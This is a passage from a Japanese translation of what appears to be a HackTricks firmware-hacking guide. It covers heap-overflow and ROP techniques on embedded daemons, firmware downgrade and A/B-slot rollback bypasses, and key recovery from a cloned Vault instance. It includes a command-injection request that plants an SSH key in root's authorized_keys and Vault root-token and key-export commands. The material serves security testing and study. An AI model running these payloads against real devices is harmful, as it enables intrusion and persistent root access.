3. **元の割り当てサイズ**に対する検証なしで、`memcpy(&ctx->buffer[offset], chunk, chunk_len)` を実行します。

これにより、攻撃者は次のような操作ができます。

- 宣言する total size が**小さい**正規の最初の fragment を送り、小さな heap allocation を強制する。
- **想定された offset** を使いながら、より大きな `chunk_len` を持つ後続 fragment を送る。
- packet-local の偽装サイズで新しい検証を通過しつつ、元の割り当て済み buffer を overflow させる。

脆弱な処理経路が commissioning logic の背後にある場合、不正な fragment を送る前に、想定される model-download または blob-download state に対象を移行させるための十分な **device emulation** が必要です。

### Protocol が引き起こす `free()` trigger

Embedded daemon では、heap metadata exploitation を引き起こす最も簡単な方法は、多くの場合「cleanup を待つ」ことではなく、**protocol 独自の error handling を強制する**ことです:<sup>[[8]](#references)</sup>

- 不正な follow-up fragment を送り、FSM を **retry** または **error** state に移行させます。
- retry threshold を超過させ、daemon に **context を reset** させて破損した buffer を free させます。
- 予測可能なこの `free()` を利用して、別の理由で process が crash する前に allocator-side primitive を引き起こします。

これは、heap chunk metadata の破損によって unlink/unbin logic を write primitive に変えられる、embedded Linux の **musl/uClibc/dlmalloc-like** allocator に対して特に有効です。安定した手法は、size field を破損させて allocator の走査を、実際の bin pointer を直接上書きして process を crash させるのではなく、overflow した buffer 内に配置した **fake chunk** へ誘導することです。

## Binary Exploitation and Proof-of-Concept

特定した脆弱性の PoC を開発するには、対象アーキテクチャを深く理解し、低レベル言語でプログラミングする必要があります。Embedded system では binary runtime protection はまれですが、存在する場合は Return Oriented Programming (ROP) などの手法が必要になることがあります。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbin と consolidation:** uClibc は glibc と同様の fastbin を使用します。後続の大きな allocation によって `__malloc_consolidate()` が呼び出される場合があるため、fake chunk はチェック（妥当な size、`fd = 0`、周辺 chunk が「使用中」と認識されること）を通過する必要があります。<sup>[[6]](#references)</sup>
- **ASLR 下の non-PIE binary:** ASLR が有効でもメイン binary が **non-PIE** なら、binary 内の `.data/.bss` address は安定しています。有効な heap chunk header に似た領域を狙うことで、fastbin allocation を **function pointer table** に配置できます。
- **parser を停止させる NUL:** JSON の parse 時に payload 内の `\x00` を使うと、後続の攻撃者制御 byte を stack pivot/ROP chain 用に残したまま、parse を停止させることができます。
- **`/proc/self/mem` 経由の shellcode:** `open("/proc/self/mem")`、`lseek()`、`write()` を呼び出す ROP chain により、既知の mapping に実行可能な shellcode を配置し、そこへ jump できます。

## Firmware Analysis 用に準備された Operating System

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) などの operating system は、firmware security testing に必要なツールを備えた、事前設定済みの環境を提供します。

## Firmware 解析用に準備された OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) device の security assessment と penetration testing を支援するための distro です。必要なツールをすべて読み込んだ事前設定済み環境を提供し、作業時間を大幅に節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tool がプリロードされた、Ubuntu 18.04 ベースの embedded security testing operating system です。

## Firmware Downgrade Attack と Insecure Update Mechanism

vendor が firmware image の cryptographic signature check を実装していても、**version rollback (downgrade) protection は省略されることがよくあります**。boot loader または recovery loader が、埋め込み済み public key で signature を検証するだけで、書き込む image の *version*（または monotonic counter）を比較しない場合、攻撃者は**古く脆弱性のある、なおかつ正規の signature が付いた firmware** を正規にインストールし、修正済みの脆弱性を再び持ち込むことができます。<sup>[[4]](#references)</sup>

一般的な攻撃手順:

1. **古い署名済み image を入手する**
   * vendor の公開 download portal、CDN、または support site から取得します。
   * companion mobile/desktop application から抽出します（例: Android APK 内の `assets/firmware/`）。
   * VirusTotal、Internet archive、forum などの third-party repository から取得します。
2. 公開されている update channel を使って、image を**デバイスに upload または提供する**:
   * Web UI、mobile-app API、USB、TFTP、MQTT など。
   * 多くの consumer IoT device には、Base64 encoded firmware blob を受け付け、server-side で decode して recovery/upgrade を開始する *unauthenticated* HTTP(S) endpoint が公開されています。
3. downgrade 後、新しい release で修正された脆弱性を悪用します（例: 後から追加された command-injection filter）。
4. 任意で、永続化を確保した後に最新 image を再度 flash するか、検出を避けるために update を無効化します。

### 例: Downgrade 後の Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（downgradeされた）firmwareでは、`md5`パラメータがサニタイズされずにシェルコマンドへ直接連結されるため、任意のコマンドをインジェクションできます（ここでは、SSH keyベースのroot accessを有効化しています）。後のfirmwareバージョンでは基本的な文字フィルターが導入されましたが、downgrade protectionがないため、この修正は意味をなしません。<sup>[[4]](#references)</sup>

### モバイルアプリからのFirmware抽出

多くのベンダーは、アプリからBluetooth/Wi-Fi経由でデバイスを更新できるよう、完全なfirmwareイメージを付属のモバイルアプリに同梱しています。これらのパッケージは、`assets/fw/`や`res/raw/`などのパスにあるAPK/APEX内に、暗号化されずに保存されていることがよくあります。`apktool`、`ghidra`、あるいは単純な`unzip`などのツールを使えば、物理ハードウェアに触れることなく、署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot設計におけるupdater限定のアンチロールバック回避

一部のベンダーはアンチダウングレード**ratchet**を実装していますが、それは*updater*ロジック内に限られます（例：CAN経由のUDSルーチン、recoveryコマンド、userspace OTA agent）。その後、**bootloader**がイメージの署名/CRCのみをチェックし、パーティションテーブルやslot metadataを信頼する場合、ロールバック保護を回避できる可能性があります。<sup>[[7]](#references)</sup>

典型的な脆弱な設計：

- Firmware metadataに、バージョン記述子と**security ratchet** / 単調増加カウンターの両方が含まれている。
- updaterは、イメージのratchetを永続ストレージに保存された値と比較し、古い署名済みイメージを拒否する。
- bootloaderはそのratchetを**解析せず**、選択されたslotを起動する前にheader、CRC、署名のみを検証する。
- slotの有効化情報は、パーティションテーブルまたはslotごとのgeneration counterに別途保存され、検証済みの正確なfirmware digestには**暗号学的に紐付けられていない**。

これにより、デュアルslotシステムで**あるイメージを検証して別のイメージを起動する**手段が生まれます。攻撃者がupdaterに現在の署名済みイメージを使ってslot Bを次回起動先に設定させ、再起動前にslot Bを上書きできる場合、bootloaderはすでに確定したslot metadataだけを信頼しているため、ダウングレードされたイメージを起動する可能性があります。

よくある悪用パターン：

1. **現在の署名済み**firmwareを非アクティブslotにアップロードし、通常の検証/切り替えルーチンを実行して、そのslotが次のアクティブslotになるようlayoutに記録する。
2. **まだ再起動しない**。同じセッション内でslot準備/消去ルーチンを再実行する。
3. 古いboot-stateやslot選択ロジックを悪用し、updaterに昇格させたばかりの**同じ物理slot**を消去させる。
4. **古いが署名は有効な**firmwareをそのslotに書き込む。
5. ratchetを強制する検証ルーチンをスキップし、直接再起動する。
6. bootloaderは昇格済みslotを選択し、署名/整合性だけを検証して古いイメージを起動する。

A/B update実装をリバースする際に確認する項目：

- slot選択が、切り替え成功後に更新されない**起動時フラグ**から導出されている。
- `prepare_passive_slot()`のようなルーチンが、**現在確定しているlayout**ではなく古い状態に基づいてslotを消去する。
- `part_write_layout()`のような関数が、検証済みイメージのhashを保存せず、**generation counter** / active flagのみを更新する。
- ratchetチェックがuserspaceまたはupdaterコードに実装されているが、ROM / bootloader / secure boot段階には**実装されていない**。
- 消去やrecoveryルーチンが、slotの内容を消去して書き換えた後も、そのslotを起動可能な状態のままにする。

### Updateロジックの評価チェックリスト

* *update endpoint*の通信/認証は適切に保護されているか（TLS + authentication）？
* 書き込み前に、デバイスは**バージョン番号**または**単調増加するアンチロールバックカウンター**を比較するか？
* イメージはsecure boot chain内で検証されるか（例：ROMコードが署名をチェックする）？
* **bootloaderはupdaterと同じratchetを強制するか**。それとも署名/CRCの確認だけか？
* slot有効化metadataは**検証済みfirmware digest/versionに紐付けられているか**、それとも昇格後にslotを変更できるか？
* slot切り替え成功後、デバイスは強制的に再起動するか。それとも同じセッション内で後続のupdate/eraseルーチンに引き続きアクセスできるか？
* userlandコードは追加の健全性チェック（例：許可されたパーティションマップ、モデル番号）を実行するか？
* *部分的な*または*バックアップ*のupdateフローは、同じ検証ロジックを再利用しているか？

> 💡  上記のいずれかが欠けている場合、そのプラットフォームはロールバック攻撃に対して脆弱である可能性が高いです。

## 練習用の脆弱なfirmware

firmwareの脆弱性を発見する練習には、以下の脆弱なfirmwareプロジェクトを出発点として使用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 組み込みKMS/Vault状態からのfirmware復号鍵の復元

updateイメージに、少量の平文metadataと大容量の高エントロピーブロブが混在している場合は、総当たりを試す前にコンテナのトリアージを行ってください。<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、header、offset、行境界をダンプする。
- `Salted__`は通常、OpenSSL `enc`形式を示す。次の8バイトがsaltで、残りがciphertext。
- `256`バイトちょうどにデコードされるBase64フィールドは、ランダムなfirmware password/session keyをラップするRSA-2048 ciphertextである可能性を強く示す。
- 同じファイル内の分離されたPGPデータは、多くの場合、真正性のみを保護する。機密性を保つ仕組みだと決めつけないこと。

静的な鍵の探索（`grep`、`strings`、PEM/PGP検索）が失敗した場合は、private keyの検索だけにとどまらず、**運用時の復号経路**をリバースしてください。

- updater / management binaryを逆コンパイルし、暗号化されたブロブを読み込む箇所、復号を行うhelper/API、要求される論理キー名を追跡する。
- 抽出したroot filesystem内で、KMS状態（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加え、unit fileやinit scriptを検索する。
- 平文の`vault operator unseal ...`、recovery key、bootstrap token、ローカルKMSの自動unseal scriptは、private key素材と同等に扱う。

アプライアンスに元のVault binaryとstorage backendが含まれている場合、Vaultの内部機能を再実装するより、その環境を再現する方が通常は簡単です。

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

クローンした KMS で root 権限を取得した状態で:

- transit key を隔離されたクローン内でのみエクスポート可能にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key をエクスポートする: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS が使用する正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 による復号に失敗し、デフォルトの OAEP による復号にも失敗したとしても、key が間違っている証拠には**なりません**。Vault ベースのフローの多くは SHA-256 を使う OAEP を使用しますが、一般的なライブラリのデフォルトは SHA-1 です。
- ペイロードが `Salted__` で始まる場合は、AES-CBC による復号を試す前に、ベンダーの OpenSSL KDF（レガシー機器では多くの場合 MD5 を使う `EVP_BytesToKey`）を正確に再現する。

これにより、「暗号化された firmware」は、より一般的な問題になります。**機器側の運用 key を復元し、正確な unwrap + KDF パラメーターをオフラインで再現することです。**

## トレーニングと認定資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude による firmware の解析: シニアレベルのスキル、ジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware セキュリティテストの方法論](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [実践 IoT hacking: Internet of Things を攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放置された hardware のゼロデイを悪用する – Trail of Bits ブログ](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルのスマートデバイスで、あなたの家にアクセスできた方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [もう見えている: 次はあなたが Pwn される番](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 充電ポートコネクターから Tesla Wall Connector を悪用する - Part 2: anti-downgrade の回避](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [点滅させよう: Philips Hue Bridge の Over-the-Air exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU 上の Tesla OS を ROOT 化する Part 1: 展開](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel ドキュメント - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU 上の Tesla OS を ROOT 化する Part 2: デバッグと修正](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS password: 弱い XOR 暗号化により SPI Flash から復元可能 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password 復元ツール](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
